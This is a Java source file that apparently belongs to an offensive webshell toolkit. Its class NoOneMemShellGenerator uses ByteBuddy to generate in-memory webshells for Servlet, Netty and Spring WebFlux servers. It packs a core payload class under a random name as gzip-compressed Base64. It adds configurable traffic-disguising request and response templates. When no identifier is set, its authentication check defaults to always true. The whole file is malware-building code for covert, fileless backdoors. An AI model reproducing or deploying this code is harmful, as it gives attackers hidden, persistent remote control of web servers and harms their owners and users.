package com.reajason.noone.core.generator;

import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.generator.ByteBuddyShellGenerator;
import com.reajason.javaweb.utils.CommonUtil;
import com.reajason.noone.core.NoOneCore;
import com.reajason.noone.core.generator.identifier.NettyHttpIdentifierVisitor;
import com.reajason.noone.core.generator.identifier.ReactorIdentifierVisitor;
import com.reajason.noone.core.generator.identifier.ServletIdentifierVisitor;
import com.reajason.noone.core.generator.protocol.WrapResDataWrapper;
import com.reajason.noone.core.generator.protocol.WrapResWrapper;
import com.reajason.noone.core.generator.protocol.netty.NettyGetPayloadFromContentWrapper;
import com.reajason.noone.core.generator.protocol.reactor.ReactorGetPayloadFromRequestWrapper;
import com.reajason.noone.core.generator.protocol.servlet.ServletGetPayloadFromRequestWrapper;
import com.reajason.noone.core.generator.transform.TransformWrapper;
import com.reajason.noone.server.profile.Profile;
import com.reajason.noone.server.profile.config.HttpProtocolConfig;
import com.reajason.noone.server.profile.config.HttpRequestBodyType;
import com.reajason.noone.server.profile.config.IdentifierConfig;
import com.reajason.noone.server.profile.config.ProtocolConfig;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.implementation.FixedValue;

import java.util.Base64;

import static net.bytebuddy.matcher.ElementMatchers.*;

public class NoOneMemShellGenerator extends ByteBuddyShellGenerator<NoOneConfig> {

    public NoOneMemShellGenerator(ShellConfig shellConfig, NoOneConfig shellToolConfig) {
        super(shellConfig, shellToolConfig);
    }

    @Override
    protected DynamicType.Builder<?> getBuilder() {
        DynamicType.Builder<?> builder = new ByteBuddy().redefine(shellToolConfig.getShellClass());

        try (DynamicType.Unloaded<NoOneCore> unloaded = new ByteBuddy()
                .redefine(NoOneCore.class)
                .name(CommonUtil.generateClassName())
                .visit(TargetJreVersionVisitorWrapper.DEFAULT)
                .make()) {
            String coreGzipBase64 = Base64.getEncoder().encodeToString(CommonUtil.gzipCompress(unloaded.getBytes()));
            builder = builder.field(named("coreGzipBase64")).value(coreGzipBase64);
        }

        Profile profile = shellToolConfig.getProfile();
        if (profile == null) {
            return builder;
        }

        builder = applyIdentifierConfig(builder, profile.getIdentifier());

        ProtocolConfig protocolConfig = profile.getProtocolConfig();
        if (protocolConfig instanceof HttpProtocolConfig httpConfig) {
            builder = applyHttpProtocolConfig(builder, httpConfig);
        }

        builder = TransformWrapper.extend(builder, profile);

        return builder;
    }

    private DynamicType.Builder<?> applyIdentifierConfig(DynamicType.Builder<?> builder, IdentifierConfig identifier) {
        if (identifier != null) {
            var implementation = isReactorShell(shellConfig.getShellType())
                    ? new ReactorIdentifierVisitor(identifier)
                    : isNettyHttpShell(shellConfig.getShellType())
                    ? new NettyHttpIdentifierVisitor(identifier)
                    : new ServletIdentifierVisitor(identifier);
            return builder
                    .method(named("isAuthed")
                            .and(takesArguments(1))
                            .and(returns(boolean.class)))
                    .intercept(implementation);
        }

        return builder.method(named("isAuthed")).intercept(FixedValue.value(true));
    }

    private DynamicType.Builder<?> applyHttpProtocolConfig(
            DynamicType.Builder<?> builder,
            HttpProtocolConfig httpConfig
    ) {
        HttpRequestBodyType requestBodyType = httpConfig.getRequestBodyType();
        String requestTemplate = httpConfig.getRequestTemplate();

        if (isNettyHttpShell(shellConfig.getShellType())) {
            builder = NettyGetPayloadFromContentWrapper.extend(builder, requestBodyType, requestTemplate);
        } else if (isReactorShell(shellConfig.getShellType())) {
            builder = ReactorGetPayloadFromRequestWrapper.extend(builder, requestBodyType, requestTemplate);
        } else {
            builder = ServletGetPayloadFromRequestWrapper.extend(builder, requestBodyType, requestTemplate);
        }

        builder = WrapResDataWrapper.extend(builder, shellToolConfig.getShellClassName(),
                httpConfig.getResponseBodyType(), httpConfig.getResponseTemplate());

        builder = WrapResWrapper.extend(builder, shellConfig.getShellType(),
                httpConfig.getResponseStatusCode(), httpConfig.getResponseHeaders());

        return builder;
    }

    private static boolean isReactorShell(String shellType) {
        return ShellType.SPRING_WEBFLUX_WEB_FILTER.equals(shellType);
    }

    private static boolean isNettyHttpShell(String shellType) {
        return ShellType.NETTY_HANDLER.equals(shellType);
    }
}
